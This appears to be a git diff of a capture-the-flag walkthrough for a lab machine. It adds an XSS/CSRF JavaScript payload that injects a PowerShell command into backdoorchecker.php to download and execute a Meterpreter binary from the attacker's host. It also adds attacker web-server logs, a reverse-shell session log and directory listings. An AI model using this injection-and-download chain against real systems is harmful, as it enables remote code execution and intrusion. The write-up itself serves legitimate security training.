@@ -374,7 +374,7 @@ Cross site request forgery... Yes, I had a hint. The XSS we had earlier could po
 
 ```js
 var request = XMLHttpRequest();
-var params = 'dir|powershell -c http://10.10.14.2:8000/x64-meterpreter.exe -outfile %temp%/meter.exe; cmd.exe /c %temp%/meter.exe';
+var params = 'cmd=dir|powershell -c http://10.10.14.2:8000/x64-meterpreter.exe -outfile %temp%/meter.exe; cmd.exe /c %temp%/meter.exe';
 
 request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
 request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -385,4 +385,80 @@ Using a bitwise OR will basically try to run both commands in PHP and we send th
 ```js
 <script src='http://10.10.14.2/mailer.js'></script>
 ```
+```http
+➜  www git:(main) ✗ sudo python3 -m http.server 80
+[sudo] password for lemur:
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [01/Aug/2023 23:58:07] "GET /mailer.js HTTP/1.1" 200 -
+10.10.10.154 - - [01/Aug/2023 23:58:32] "GET /mailer.js HTTP/1.1" 200 -
+```
+```http
+➜  payload git:(main) ✗ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.154 - - [01/Aug/2023 23:58:07] "GET /x64-meterpreter.exe HTTP/1.1" 200 -
+10.10.10.154 - - [01/Aug/2023 23:58:33] "GET /x64-meterpreter.exe HTTP/1.1" 200 -
+```
+
+```bash
+[*] Started reverse TCP handler on 10.10.14.2:443
+[*] Sending stage (200774 bytes) to 10.10.10.154
+[*] Meterpreter session 1 opened (10.10.14.2:443 -> 10.10.10.154:49978) at 2023-08-01 23:58:10 -0400
+
+meterpreter > dir
+Listing: C:\xampp\htdocs\admin
+==============================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  271    fil   2018-12-20 19:49:56 -0500  auth.php
+100666/rw-rw-rw-  1001   fil   2019-04-27 10:13:01 -0400  backdoorchecker.php
+100666/rw-rw-rw-  567    fil   2018-12-22 06:40:23 -0500  handle.php
+100666/rw-rw-rw-  10584  fil   2019-04-27 16:26:06 -0400  index.php
+100666/rw-rw-rw-  414    fil   2018-12-22 06:40:27 -0500  search.php
+```
+
+## Initial Foothold
+```powershell
+meterpreter > dir
+Listing: C:\Users\Cortin
+========================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  AppData
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Application Data
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Contacts
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Cookies
+040555/r-xr-xr-x  0        dir   2019-04-25 16:16:03 -0400  Desktop
+040555/r-xr-xr-x  4096     dir   2019-04-24 20:58:46 -0400  Documents
+040555/r-xr-xr-x  4096     dir   2019-04-24 21:15:16 -0400  Downloads
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Favorites
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:47 -0400  Links
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Local Settings
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Menu Start
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Mijn documenten
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Music
+100666/rw-rw-rw-  1048576  fil   2022-10-21 08:11:10 -0400  NTUSER.DAT
+100666/rw-rw-rw-  65536    fil   2019-04-24 21:23:54 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
+                                                            M.blf
+100666/rw-rw-rw-  524288   fil   2019-04-24 21:23:54 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
+                                                            MContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288   fil   2019-04-24 11:56:37 -0400  NTUSER.DAT{f5b13604-4b48-11e6-80cb-e41d2d012050}.T
+                                                            MContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  NetHood
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Netwerkprinteromgeving
+040555/r-xr-xr-x  0        dir   2019-08-16 09:15:02 -0400  OneDrive
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Pictures
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Recent
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:47 -0400  Saved Games
+040555/r-xr-xr-x  4096     dir   2019-04-24 20:58:46 -0400  Searches
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  SendTo
+040777/rwxrwxrwx  0        dir   2019-04-24 11:51:28 -0400  Sjablonen
+040555/r-xr-xr-x  0        dir   2019-04-24 20:58:46 -0400  Videos
+100666/rw-rw-rw-  307200   fil   2019-04-24 11:51:28 -0400  ntuser.dat.LOG1
+100666/rw-rw-rw-  229376   fil   2019-04-24 11:51:28 -0400  ntuser.dat.LOG2
+100666/rw-rw-rw-  20       fil   2019-04-24 11:51:28 -0400  ntuser.ini
+```
+
+Some of these names are in a different language.  It's written in Dutch, according to Google.
 
